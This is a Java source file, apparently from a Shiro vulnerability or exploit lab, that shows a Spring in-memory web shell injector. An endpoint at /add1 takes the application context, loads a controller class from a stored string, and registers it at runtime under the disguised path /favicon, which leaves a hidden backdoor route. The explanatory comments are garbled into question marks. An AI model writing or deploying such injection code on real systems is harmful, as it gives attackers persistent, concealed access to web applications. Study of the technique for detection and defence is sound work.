package com.shiro.vuln.SpringMemShell.test;

import com.shiro.vuln.util.ClassUtil;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Method;

@Controller
public class AddShellController0 {
    @RequestMapping(value = "/add1")
    public void add(HttpServletRequest request, HttpServletResponse response){
        try {
            final String controllerPath = "/favicon";
            // first
//            WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
            // second
//            WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
            // third
//            WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
            // fourth
            WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            // fifth
//            WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());


            // 1. ????????????????????????????????? RequestMappingHandlerMapping ????????? bean
            RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
            // 2. ??????????????????????????? controller ???????????? Method ??????
            Class<?> clazz = ClassUtil.getClass(ClassUtil.CONTROLLER_STRING);
            Method method = (clazz.getDeclaredMethods())[0];
            // 3. ???????????? controller ??? URL ??????
            PatternsRequestCondition url = new PatternsRequestCondition(controllerPath);
            // 4. ?????????????????? controller ??? HTTP ?????????GET/POST???
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
            // 5. ???????????????????????? controller
            RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
            r.registerMapping(info, clazz.newInstance(), method);

            response.getWriter().println("spring controller added");
        }catch (Exception e){
            e.printStackTrace();
        }

    }
}
